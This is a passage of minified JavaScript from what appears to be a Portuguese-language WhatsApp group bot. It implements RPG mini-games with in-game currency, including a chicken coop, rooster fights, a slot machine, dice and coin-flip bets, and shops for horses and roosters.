              txt = "Olá *" + _0x32e455.split("@")[0] + "*, aqui está as informações sobre seu galinheiro!\n• Seu galinheiro está atualmente no level: *" + galosrpg[AD].level + "*\n——\n• [🚧] Área total do Galinheiro: *" + Number(galosrpg[AD].level) * Number(galosrpg[AD].level) + "m²*\n——\n• [🏡] *Habitantes do seu Galinheiro:*\n• Quantidade de Galo(s) que você tem em seu galinheiro atualmente: *" + galosrpg[AD].galos.length + "/" + Number(galosrpg[AD].level) * 5 + "*\n• Quantidade de Galinha(s) que você tem em seu galinheiro atualmente: *" + galosrpg[AD].galinhas + "/" + Number(galosrpg[AD].level) * 2 + "*\n• Quantidade de Ovo(s) que as suas galinhas colocaram: *" + galosrpg[AD].ovos + "/" + Number(galosrpg[AD].level) * 2 + "*\n• Expectativa média de vida de seus bichinhos: *" + TT1 + "*\n——\n• [🏆] *Médias e Porcentagens:*\n• Sua média de vitórias conquistadas por seu(s) bichinho(s): *" + TT2 + "*\n• Sua média percentual atualmente em seu galinheiro: *" + TT3 + "*";
              _0x5b6fe5(txt);
              break;
            case "upgalo":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*. *" + _0x1d93be + "botrpg*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galinheiro antes...");
              }
              _0x3529b0 = sabrpg.map(_0x169efe => _0x169efe.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x274711 => _0x274711.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < Number(Number(galosrpg[AD].level) * 100)) {
                return _0x403602("Você não possui saldo suficiente para efetuar essa compra...");
              }
              if (Number(galosrpg[AD].level) < 6) {
                _0x531709 = galosrpg[AD].level;
                galosrpg[AD].level = Number(_0x531709) + 1;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                MD = sabrpg[_0x3529b0].money;
                sabrpg[_0x3529b0].money = Number(MD) - 1000;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("Seu galinheiro foi upado para o level " + galosrpg[AD].level + " com sucesso...");
              } else {
                _0x403602("Seu galinheiro está no level máximo!😿 Não é possível aumentar!");
              }
              break;
            case "galo":
            case "galos":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x589394) {
                return _0x403602("É nescessário a ativação do *MODO RPG* no grupo! \nUse *" + _0x1d93be + "modorpg 1 / 0*.");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(galosrpg).includes(_0x32e455)) {
                return _0x403602("Você precisa comprar um galo antes!");
              }
              _0x3529b0 = sabrpg.map(_0x468dbf => _0x468dbf.id).indexOf(_0x32e455);
              AD = galosrpg.map(_0x3a9e0b => _0x3a9e0b.id).indexOf(_0x32e455);
              galosH = moment.tz("America/Sao_Paulo").format("HH");
              galosD = moment.tz("America/Sao_Paulo").format("DD");
              galosM = moment.tz("America/Sao_Paulo").format("MM");
              if (Number(galosrpg[AD].galos.length) > 0) {
                if (!_0x1d6557) {
                  return _0x403602("Vix lek, cê caiu em uma briga ilegal de galos...🐔 Faça logo a sua aposta, e venha dançar!");
                }
                if (!Number(_0x40e45c[0])) {
                  return _0x403602(_0x40e45c[0] + " não é número...");
                }
                if (Number(_0x40e45c[0]) > Number(sabrpg[_0x3529b0].money)) {
                  return _0x403602("Você não tem saldo suficiente para efetuar essa aposta...");
                }
                if (Number(_0x40e45c[0]) > 100) {
                  return _0x403602("Não é possível apostar mais que R$ 100.00 em uma briga ilegal e clandestina...");
                }
                if (Number(_0x40e45c[0]) < 1) {
                  return _0x403602("Deixa de ser pobre lek");
                }
                if (Number(galosrpg[AD].brigaL) <= 0) {
                  return _0x403602("Chega de brigas por agora... Volte mais tarde");
                }
                if (Number(galosH) > Number(galosrpg[AD].brigaH) && Number(galosrpg[AD].brigaD) === Number(galosD) && Number(galosrpg[AD].brigaM) === Number(galosM) && Number(galosrpg[AD].brigaL) <= 0) {
                  galosrpg[AD].brigaL = 15;
                  galosrpg[AD].brigaH = galosH;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  _0x403602("Bem vindo (a) de volta, hora de brigar...");
                }
                if (Number(galosD) > Number(galosrpg[AD].brigaD) && Number(galosrpg[AD].brigaM) === Number(galosM)) {
                  galosrpg[AD].brigaL = 15;
                  galosrpg[AD].brigaH = galosH;
                  galosrpg[AD].brigaD = galosD;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  _0x403602(_0x6965b0 + " usuário, vamos brigar ?");
                }
                if (Number(galosM) > Number(galosrpg[AD].brigaM)) {
                  galosrpg[AD].brigaL = 15;
                  galosrpg[AD].brigaH = galosH;
                  galosrpg[AD].brigaD = galosD;
                  galosrpg[AD].brigaM = galosM;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                  _0x403602(_0x6965b0 + " usuário, vamos brigar?");
                }
                if (Number(galosrpg[AD].brigaD) == Number(galosD) && Number(galosrpg[AD].brigaM) == Number(galosM) && Number(galosrpg[AD].brigaL) > 0) {
                  galosgeral = galosrpg[AD].galos;
                  alegalo = galosgeral[Math.floor(Math.random() * galosgeral.length)];
                  jeffinho = Math.floor(Math.random() * 100);
                  if (Number(jeffinho) > 30) {
                    if (Number(alegalo.vida) > 0) {
                      VD = alegalo.vida;
                      CD = alegalo.degalo;
                      alegalo.vida = Number(VD) - 1;
                      alegalo.degalo = Number(CD) + 1;
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                      brigatxt = "Seu galo perdeu a briga!🐔 Você perdeu R$ " + Number(_0x40e45c[0]).toFixed(2);
                    } else {
                      galosgeral.splice(alegalo, 1);
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                      brigatxt = "O galo inimigo matou o seu galo na briga!🐔 Você perdeu R$ " + Number(_0x40e45c[0]).toFixed(2) + " " + (Number(galosrpg[galosrpg.map(_0x844ba3 => _0x844ba3.id).indexOf(_0x32e455)].galos.length) > 1 ? "\nFelizmente, você ainda possui " + galosrpg[galosrpg.map(_0x6507d3 => _0x6507d3.id).indexOf(_0x32e455)].galos.length : "");
                    }
                    JH = galosrpg[galosrpg.map(_0xd7b2d2 => _0xd7b2d2.id).indexOf(_0x32e455)].countDg;
                    JH2 = galosrpg[galosrpg.map(_0x253c9a => _0x253c9a.id).indexOf(_0x32e455)].dinVg;
                    JH3 = galosrpg[galosrpg.map(_0x4b1be0 => _0x4b1be0.id).indexOf(_0x32e455)].brigaL;
                    galosrpg[galosrpg.map(_0x30018d => _0x30018d.id).indexOf(_0x32e455)].countDg = Number(JH) + 1;
                    galosrpg[galosrpg.map(_0x181fef => _0x181fef.id).indexOf(_0x32e455)].dinVg = Number(JH2) + Number(_0x40e45c[0]);
                    galosrpg[galosrpg.map(_0x3e1b49 => _0x3e1b49.id).indexOf(_0x32e455)].brigaL = Number(JH3) - 1;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                    MD = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MD) - Number(_0x40e45c[0]);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602(brigatxt);
                  } else {
                    if (Number(alegalo.vida) > 0) {
                      VD = alegalo.vida;
                      CV = alegalo.vigalo;
                      alegalo.vida = Number(VD) - 1;
                      alegalo.vigalo = Number(CV) + 1;
                      if (Number(alegalo.degalo) > 0) {
                        NN = alegalo.degalo;
                        alegalo.degalo = Number(NN) + 1;
                      }
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                      brigawin = "Seu galo venceu a briga!🐓 Você ganhou *R$ " + Number(Number(_0x40e45c[0]) * 2).toFixed(2) + "*";
                    } else {
                      galosgeral.splice(alegalo, 1);
                      fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                      brigawin = " Seu galo venceu a briga!🐓 Mas foi sequestrado e morto no caminho... Felizmente, você levou o dinheiro.\n• Você ganhou *R$ " + Number(Number(_0x40e45c[0]) * 2).toFixed(2) + "*";
                    }
                    KL = galosrpg[galosrpg.map(_0x5a6376 => _0x5a6376.id).indexOf(_0x32e455)].countVg;
                    KL2 = galosrpg[galosrpg.map(_0x3b5253 => _0x3b5253.id).indexOf(_0x32e455)].dinVg;
                    KL3 = galosrpg[galosrpg.map(_0x32422d => _0x32422d.id).indexOf(_0x32e455)].luckVg;
                    KL4 = galosrpg[galosrpg.map(_0x509a55 => _0x509a55.id).indexOf(_0x32e455)].brigaL;
                    galosrpg[galosrpg.map(_0x4df67c => _0x4df67c.id).indexOf(_0x32e455)].countVg = Number(KL) + 1;
                    galosrpg[galosrpg.map(_0x4f5b75 => _0x4f5b75.id).indexOf(_0x32e455)].dinVg = Number(KL2) + Number(_0x40e45c[0]);
                    galosrpg[galosrpg.map(_0x34419f => _0x34419f.id).indexOf(_0x32e455)].luckVg = Number(KL3) + Number(_0x40e45c[0]);
                    galosrpg[galosrpg.map(_0x28f7f9 => _0x28f7f9.id).indexOf(_0x32e455)].brigaL = Number(KL4) - 1;
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/galosrpg.json", JSON.stringify(galosrpg));
                    MD = sabrpg[_0x3529b0].money;
                    sabrpg[_0x3529b0].money = Number(MD) + Number(_0x40e45c[0]);
                    fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                    _0x403602(brigawin);
                  }
                }
              } else {
                _0x403602("Você não possui galos! 🐓😿");
              }
              break;
            case "cassino":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              horacass = moment.tz("America/Sao_Paulo").format("HH");
              diacass = moment.tz("America/Sao_Paulo").format("DD");
              mmcass = moment.tz("America/Sao_Paulo").format("MM");
              _0x3529b0 = sabrpg.map(_0x2fc9a3 => _0x2fc9a3.id).indexOf(_0x32e455);
              if (Number(_0x40e45c[0]) > Number(sabrpg[_0x3529b0].money)) {
                return _0x403602("Você não possui saldo suficiente para efetuar essa aposta...");
              }
              if (Number(sabrpg[_0x3529b0].limiteC) === 0 && Number(sabrpg[_0x3529b0].horaC) === Number(horacass)) {
                return _0x403602("*Você já apostou muito hoje...* Suas chances estão esgotadas! Por favor, volte mais tarde! 😔😭");
              }
              HC = Number(sabrpg[_0x3529b0].horaC) + 1;
              if (Number(horacass) > Number(sabrpg[_0x3529b0].horaC) && Number(sabrpg[_0x3529b0].diaC) === Number(diacass) && Number(sabrpg[_0x3529b0].mC) === Number(mmcass)) {
                sabrpg[_0x3529b0].limiteC = 20;
                sabrpg[_0x3529b0].horaC = horacass;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("😝🤪 Mas já mlk? Bora apostar então, eu ainda vou sugar muito teu dinheiro!");
              }
              if (Number(sabrpg[_0x3529b0].limiteC) === 0 && Number(diacass) > Number(sabrpg[_0x3529b0].diaC)) {
                sabrpg[_0x3529b0].limiteC = 20;
                sabrpg[_0x3529b0].horaC = horacass;
                sabrpg[_0x3529b0].diaC = diacass;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("💰🌟 " + _0x6965b0 + " caro jogador, como está a sua sorte hj?");
              }
              if (Number(sabrpg[_0x3529b0].limiteC) === 0 && Number(mmcass) > Number(sabrpg[_0x3529b0].mC)) {
                sabrpg[_0x3529b0].limiteC = 30;
                sabrpg[_0x3529b0].horaC = horacass;
                sabrpg[_0x3529b0].diaC = diacass;
                sabrpg[_0x3529b0].mC = mmcass;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                _0x403602("📆🗣 Primeira aposta do mês? Eu ainda vou sugar muito teu dinheiro todo...");
              }
              if (Number(sabrpg[_0x3529b0].limiteC) > 0) {
                if (!_0x1d6557) {
                  return _0x403602("Você deve escolher uma quantia para apostar... Ex: " + (_0x1d93be + _0x3dec88) + " 100 _(você estará apostando R$ 100.00)_");
                }
                if (Number(_0x40e45c[0]) < 10) {
                  return _0x403602("Não é possível apostar menos que R$ 10.00");
                }
                if (Number(_0x40e45c[0]) > 20000) {
                  return _0x403602("Não é possível apostar mais que R$ 20000.00! 😿");
                }
                if (!Number(_0x40e45c[0])) {
                  return _0x403602("*" + _0x40e45c[0] + "* não é número! 😿");
                }
                frutasC = JSON.parse(fs.readFileSync("./DADOS/slots.json"));
                resulC = frutasC[Math.floor(Math.random() * frutasC.length)] + " : " + frutasC[Math.floor(Math.random() * frutasC.length)] + " : " + frutasC[Math.floor(Math.random() * frutasC.length)];
                if (resulC == "🦴 : 🦴 : 🦴") {
                  _0x6aaae = Number(sabrpg[_0x3529b0].limiteC) - 1;
                  sabrpg[_0x3529b0].money = 50;
                  sabrpg[_0x3529b0].limiteC = _0x6aaae;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                  _0x403602("• *[" + resulC + "]* - Óia a bruxa passando... Todo o dinheiro da sua conta agora é dela!");
                }
                if (resulC == "🍫 : 🍫 : 🍫") {
                  cmrpg = 1000;
                }
                ;
                if (resulC == "🍔 : 🍔 : 🍔") {
                  cmrpg = 600;
                }
                ;
                if (resulC == "🥩 : 🥩 : 🥩") {
                  cmrpg = 400;
                }
                ;
                if (resulC == "🍕 : 🍕 : 🍕") {
                  cmrpg = 250;
                }
                ;
                if (resulC == "🌶️ : 🌶️ : 🌶️") {
                  cmrpg = 200;
                }
                ;
                if (resulC == "🍪 : 🍪 : 🍪") {
                  cmrpg = 100;
                }
                ;
                if (resulC == "🍗 : 🍗 : 🍗") {
                  cmrpg = 80;
                }
                ;
                if (resulC == "🌭 : 🌭 : 🌭") {
                  cmrpg = 70;
                }
                ;
                if (resulC == "🥞 : 🥞 : 🥞") {
                  cmrpg = 60;
                }
                ;
                if (resulC == "🥓 : 🥓 : 🥓") {
                  cmrpg = 50;
                }
                ;
                if (resulC == "🧇 : 🧇 : 🧇" || resulC == "🍞 : 🍞 : 🍞" || resulC == "🥐 : 🥐 : 🥐" || resulC == "🥥 : 🥥 : 🥥" || resulC == "🍎 : 🍎 : 🍎" || resulC == "🍌 : 🍌 : 🍌" || resulC == "🍓 : 🍓 : 🍓") {
                  cmrpg = 40;
                }
                ;
                if (resulC == "🍐 : 🍐 : 🍐" || resulC == "🍊 : 🍊 : 🍊" || resulC == "🍋 : 🍋 : 🍋" || resulC == "🍉 : 🍉 : 🍉" || resulC == "🍇 : 🍇 : 🍇" || resulC == "🍒 : 🍒 : 🍒" || resulC == "🍑 : 🍑 : 🍑" || resulC == "🥭 : 🥭 : 🥭" || resulC == "🍍 : 🍍 : 🍍" || resulC == "🥝 : 🥝 : 🥝" || resulC == "🍅 : 🍅 : 🍅" || resulC == "🥑 : 🥑 : 🥑" || resulC == "🌽 : 🌽 : 🌽" || resulC == "🥕 : 🥕 : 🥕") {
                  cmrpg = 30;
                }
                if (resulC == "🍫 : 🍫 : 🍫" || resulC == "🍔 : 🍔 : 🍔" || resulC == "🥩 : 🥩 : 🥩" || resulC == "🍕 : 🍕 : 🍕" || resulC == "🌶️ : 🌶️ : 🌶️" || resulC == "🍪 : 🍪 : 🍪" || resulC == "🍗 : 🍗 : 🍗" || resulC == "🌭 : 🌭 : 🌭" || resulC == "🥞 : 🥞 : 🥞" || resulC == "🥓 : 🥓 : 🥓" || resulC == "🧇 : 🧇 : 🧇" || resulC == "🍞 : 🍞 : 🍞" || resulC == "🥐 : 🥐 : 🥐" || resulC == "🥥 : 🥥 : 🥥" || resulC == "🍎 : 🍎 : 🍎" || resulC == "🍌 : 🍌 : 🍌" || resulC == "🍓 : 🍓 : 🍓" || resulC == "🍐 : 🍐 : 🍐" || resulC == "🍊 : 🍊 : 🍊" || resulC == "🍋 : 🍋 : 🍋" || resulC == "🍉 : 🍉 : 🍉" || resulC == "🍇 : 🍇 : 🍇" || resulC == "🍒 : 🍒 : 🍒" || resulC == "🍑 : 🍑 : 🍑" || resulC == "🥭 : 🥭 : 🥭" || resulC == "🍍 : 🍍 : 🍍" || resulC == "🥝 : 🥝 : 🥝" || resulC == "🍅 : 🍅 : 🍅" || resulC == "🥑 : 🥑 : 🥑" || resulC == "🌽 : 🌽 : 🌽" || resulC == "🥕 : 🥕 : 🥕") {
                  var _0x3d0790 = "Você acaba de ganhar";
                  var _0x6aaae = Number(sabrpg[_0x3529b0].limiteC) - 1;
                  var _0x187bea = sabrpg[_0x3529b0].money;
                  var _0x57d9b2 = Number(_0x40e45c[0]) * Number(cmrpg);
                  var _0x28fd45 = Number(_0x57d9b2) + Number(_0x40e45c[0]);
                  var _0x3301ad = Number(_0x187bea) + Number(_0x28fd45) * 5;
                  var _0x3d9866 = "R$ " + Number(_0x28fd45).toFixed(2);
                  sabrpg[_0x3529b0].money = _0x3301ad;
                  sabrpg[_0x3529b0].limiteC = _0x6aaae;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                } else {
                  var _0x3d0790 = "Você perdeu! Como punição, você perderá";
                  var _0x6aaae = Number(sabrpg[_0x3529b0].limiteC) - 1;
                  var _0x187bea = sabrpg[_0x3529b0].money;
                  var _0x3301ad = Number(_0x187bea) - Number(_0x40e45c[0]);
                  var _0x3d9866 = "R$ " + Number(_0x40e45c[0]).toFixed(2);
                  sabrpg[_0x3529b0].money = _0x3301ad;
                  sabrpg[_0x3529b0].limiteC = _0x6aaae;
                  fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                }
                const _0x3d2023 = "\n┏━━━━❪🎰❫━━━━\n┣   " + _0x3d0790 + "\n┣    " + _0x3d9866 + "\n┣► " + resulC + "◄┛\n┣.   \n┗━━━━❪💰❫━━━━\n";
                _0x403602(_0x3d2023);
              }
              break;
            case "dadoapostado":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🎲");
              }, 300);
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              var [_0x4c2c7f, _0x128997] = _0x1d6557.split("/");
              if (!_0x4c2c7f) {
                return _0x403602("Digite o valor do dado que você acha que irá cair... Após isso, coloque uma (/) ao lado e coloque uma quantia a ser apostada.\n–\nEx: " + (_0x1d93be + _0x3dec88) + " 5/25 _(você estará apostando R$ 25.00 no dado 5)_");
              }
              if (!_0x128997) {
                return _0x403602("Você não disse quanto irá apostar...");
              }
              _0x3529b0 = sabrpg.map(_0x69e43 => _0x69e43.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < Number(_0x128997)) {
                return _0x403602("Sua aposta é muito alta para o saldo na sua conta... Por favor, escolha uma aposta menor.");
              }
              if (!Number(_0x4c2c7f)) {
                return _0x403602(_0x4c2c7f + " não é número!");
              }
              if (!Number(_0x128997)) {
                return _0x403602(_0x128997 + " não é número!");
              }
              if (Number(_0x128997) > 100) {
                return _0x403602("Não é possível apostar mais do que R$ 100.00");
              }
              if (Number(_0x4c2c7f) < 1 || Number(_0x4c2c7f) > 6) {
                return _0x403602("Este número no dado não existe...");
              }
              _0x403602("Sorteando dado(s)!");
              dadoale = Math.floor(Math.random() * 5) + 1;
              _0x2f53f1("./DADOS/usuarios/data/media/sticker/dados/" + dadoale + ".webp");
              if (Number(dadoale) === Number(_0x4c2c7f)) {
                DD = Number(sabrpg[_0x3529b0].money) + Number(_0x128997);
                sabrpg[_0x3529b0].money = DD;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                setTimeout(() => {
                  BC = sabrpg.map(_0x5793b0 => _0x5793b0.id).indexOf(_0x32e455);
                  _0x5b6fe5("🎉🌟 Parabéns *@" + _0x32e455.split("@")[0] + "*, você ganhou R$ *" + Number(_0x128997).toFixed(2) + "* por acertar a previsão do dado.");
                }, 5000);
              } else {
                DD = Number(sabrpg[_0x3529b0].money) - Number(_0x128997);
                sabrpg[_0x3529b0].money = DD;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                setTimeout(() => {
                  BD = sabrpg.map(_0x4bb176 => _0x4bb176.id).indexOf(_0x32e455);
                  _0x5b6fe5("😿 Infelizmente *@" + _0x32e455.split("@")[0] + "*, você perdeu *R$ " + Number(_0x128997).toFixed(2) + "* por errar a previsão do dado.");
                }, 5000);
              }
              break;
            case "caracoroa":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🪙");
              }, 300);
              if (!_0x23cd8e) {
                return _0x403602("Este tipo de comando só pode ser utilizado com o modobrincadeira ativo, fale com um adm ou se você for um, apenas digite " + _0x1d93be + "modobrincadeira 1");
              }
              if (!JSON.stringify(sabrpg).includes(_0x32e455)) {
                return _0x403602(_0x6965b0 + " usuário(a), novo(a) por aqui? Use *" + _0x1d93be + "rgbc* para se registrar na Bot City.");
              }
              var [_0x4c2c7f, _0x128997] = _0x1d6557.split("/");
              if (Number(_0x128997) > 1000) {
                return _0x403602("Tbm não pode passar de 1000 né meu camarada kkk");
              }
              if (_0x4c2c7f.length == 0) {
                return _0x403602("Digite o lado que a moeda que você acha que irá cair, ou seja, cara ou coroa... Após isso, coloque uma (/) ao lado e coloque a quantia que você deseja apostar, por exemplo: 1.\n–\n• Ex: " + (_0x1d93be + _0x3dec88) + " cara/25 _(você estará apostando R$25.00 na posição do lado da cara da moeda)_");
              }
              if (_0x4c2c7f.toLowerCase() != "cara" && _0x4c2c7f.toLowerCase() != "coroa") {
                return _0x403602("Só pode cara ou coroa.");
              }
              if (!_0x128997) {
                return _0x403602("Você não disse quanto irá apostar...");
              }
              _0x3529b0 = sabrpg.map(_0x3a7669 => _0x3a7669.id).indexOf(_0x32e455);
              if (Number(sabrpg[_0x3529b0].money) < Number(_0x128997)) {
                return _0x403602("Sua aposta é muito alta para o saldo na sua conta... Por favor, escolha uma aposta menor.");
              }
              if (!Number(_0x128997)) {
                return _0x403602(_0x128997 + " não é um número!");
              }
              if (Number(_0x128997) > 100) {
                return _0x403602("Não é possível apostar mais do que R$ 100.00");
              }
              _0x403602("Sorteando... Aguarde, daqui a pouco o resultado sai!");
              ladosDaMoeda = ["coroa", "cara"];
              pegarInfo = ladosDaMoeda[Math.floor(Math.random() * ladosDaMoeda.length)];
              _0x2f53f1("./DADOS/usuarios/data/media/sticker/caracoroa/" + pegarInfo + ".webp");
              if (pegarInfo === _0x4c2c7f) {
                DD = Number(sabrpg[_0x3529b0].money) + Number(_0x128997);
                sabrpg[_0x3529b0].money = DD;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                setTimeout(() => {
                  BC = sabrpg.map(_0x456412 => _0x456412.id).indexOf(_0x32e455);
                  _0x5b6fe5("🎉🌟 Parabéns *@" + _0x32e455.split("@")[0] + "*, você ganhou R$ *" + Number(_0x128997).toFixed(2) + "* por acertar a posição da moeda.\n• O resultado da posição do lado da moeda era a : *" + pegarInfo + "*");
                }, 5000);
              } else {
                DD = Number(sabrpg[_0x3529b0].money) - Number(_0x128997);
                sabrpg[_0x3529b0].money = DD;
                fs.writeFileSync("./DADOS/usuarios/usuarios/SystemRPG/sabrpg.json", JSON.stringify(sabrpg));
                setTimeout(() => {
                  BD = sabrpg.map(_0x413051 => _0x413051.id).indexOf(_0x32e455);
                  _0x5b6fe5("😿 Infelizmente *@" + _0x32e455.split("@")[0] + "*, você perdeu *R$ " + Number(_0x128997).toFixed(2) + "* por errar a posição da moeda.\n• O resultado da posição do lado da moeda era a : *" + pegarInfo + "*");
                }, 5000);
              }
              break;
            case "lojas_bc":
            case "lojarpg":
            case "lojas":
              _0x5b6fe5(_0x6965b0 + " *@" + _0x32e455.split("@")[0] + "*, bem vindo a minha loja de RPG!\n—–\n❱❱ Lojas de Cavalos: *" + _0x1d93be + "lojadecavalos*\n❱❱ Lojas de Galos: *" + _0x1d93be + "lojadegalos*\n—–\n🛍️ *Produtos:*\n*1.* Comprar Segurança *[R$ 600.00]*\n❑→ " + _0x1d93be + "comprarsegurança 1 | Você consegue *40% de proteção*!\n*2.* Comprar Segurança *[R$ 1200.00]*\n❑→ " + _0x1d93be + "comprarsegurança 2 | Você consegue *60% de proteção*!\n*3.* Comprar Segurança *[R$ 1800.00]*\n❑→ " + _0x1d93be + "comprarsegurança 3 | Você consegue *80% de proteção*!");
              break;
            case "lojadecavalos":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🐎");
              }, 300);
              if (JSON.stringify(cavalosrpg).includes(_0x32e455)) {
                AC = cavalosrpg.map(_0x3c9b1d => _0x3c9b1d.id).indexOf(_0x32e455);
                if (Number(cavalosrpg[AC].level) < 4) {
                  uparcavalo = "R$ " + Number(Number(cavalosrpg[AC].level) * 200).toFixed(2);
                } else {
                  uparcavalo = "Lv. Máx";
                }
              } else {
                uparcavalo = "R$ 200.00";
              }
              txt = _0x6965b0 + " *@" + _0x32e455.split("@")[0] + "*, Seja bem vindo(a) à loja de cavalos:\n—\n❱❱ " + _0x1d93be + "comprarestabulo *[R$ 500.00]* - De início é necessário você comprar.\n❱❱ " + _0x1d93be + "upcavalo - Faça um upload em seu(s) cavalo(s). *[" + uparcavalo + "]*\n—\n🐎 *Comprar Cavalos:*\n❱❱ " + _0x1d93be + "comprarcavalo 1 *[R$ 500.00]*\n❱❱ " + _0x1d93be + "comprarcavalo 2 *[R$ 1000.00]*\n❱❱ " + _0x1d93be + "comprarcavalo 3 *[R$ 1500.00]*\n❱❱ " + _0x1d93be + "comprarcavalo 4 *[R$ 2000.00]*\n—\n🌾 *Equipamentos:*\n❱❱ " + _0x1d93be + "comprarsela *[R$ 200.00]* - Compre uma sela para o seu cavalo.\n❱❱ " + _0x1d93be + "cdcv3 *[R$ 200.00]* - Verifique o status atual de seu alazão.\n❱❱ " + _0x1d93be + "atadura *[R$ 250.00]* - Caso tenha alguma fratura em alazão.\n—\n🏪 *Vendas:*\n❱❱ Para vender seu alazão, use o comando ao lado: *" + _0x1d93be + "vendercavalo*\n❱❱ Para vender seu estábulo, use o comando ao lado: *" + _0x1d93be + "venderestabulo*";
              _0x5b6fe5(txt);
              break;
            case "lojadegalos":
              setTimeout(() => {
                _0x1b86ad(_0x4f1071, "🐔");
              }, 300);
              if (JSON.stringify(galosrpg).includes(_0x32e455)) {
                AD = galosrpg.map(_0x2bb5ca => _0x2bb5ca.id).indexOf(_0x32e455);
                if (Number(galosrpg[AD].level) < 6) {
                  LV = "R$ " + Number(galosrpg[AD].level) * 100 + ".00";
                } else {
                  LV = "Lv. Máx";
                }
                PC = LV;
              } else {
                PC = "R$ 100.00";
              }
              txt = "*" + _0x6965b0 + "* @" + _0x32e455.split("@")[0] + ", Seja bem vindo(a) à loja de galos:\n🐓🏷 *Loja de Galos:*\n❱❱ " + _0x1d93be + "comprargalinheiro *[R$ 500.00]*\n❱❱ " + _0x1d93be + "comprargalo 1 *[R$ 100.00]*\n❱❱ " + _0x1d93be + "comprargalo 6 *[R$ 550.00]*\n❱❱ " + _0x1d93be + "comprargalo 12 *R$ 1000.00]*\n❱❱ " + _0x1d93be + "comprargalinha *[R$ 100.00]*\n❱❱ " + _0x1d93be + "upgalo *[" + PC + "]*\n––\n🐓🏷 *Vendas:*\n❱❱ Venda de Galos: *" + _0x1d93be + "vendergalo (quantidade)*\n❱❱ Venda de Galinhas: *" + _0x1d93be + "vendergalinha (quantidade)*";
              _0x5b6fe5(txt);
              break;
            case "anagrama":
              if (!_0xd20756) {
                return _0x403602(enviar.msg.grupo);
              }
              if (!_0x150e9e && !_0x35021e) {
                return _0x403602("Somente adms!");
              }
              if (!_0x23cd8e) {
